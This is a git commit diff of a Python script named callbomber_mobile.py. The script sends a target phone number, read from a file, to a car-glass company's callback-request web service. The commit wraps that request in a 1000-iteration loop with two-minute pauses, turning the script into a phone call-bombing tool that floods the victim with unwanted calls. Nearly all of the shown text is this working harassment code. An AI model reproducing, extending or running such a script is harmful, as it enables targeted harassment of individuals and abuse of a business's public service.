7edc9010373625b547a57b618ee08a3b9b3de969
Clément <44845040+ky0ox@users.noreply.github.com>
2019-11-23 19:31:18 +0100

    Add files via upload

--- callbomber_mobile.py
+++ callbomber_mobile.py
@@ -5,7 +5,8 @@ sur_name = open('surname.ini','r')
 number = open('phonenumber.ini','r')
 phonenumber = number.read()
 for line in name:
-	surname = sur_name.readline()
-	r = requests.get("https://www.carglass.fr/webservice/contact?name="+line+"&surname=&e164="+phonenumber+"&delay=0&reason=NBOL&csrf_token=true")
-	print("Calling "+phonenumber+"...")
-	sleep(120)
+	for i in range(0,1000):
+		surname = sur_name.readline()
+		r = requests.get("https://www.carglass.fr/webservice/contact?name="+line+"&surname=&e164="+phonenumber+"&delay=0&reason=NBOL&csrf_token=true")
+		print("Calling "+phonenumber+"...")
+		sleep(120)
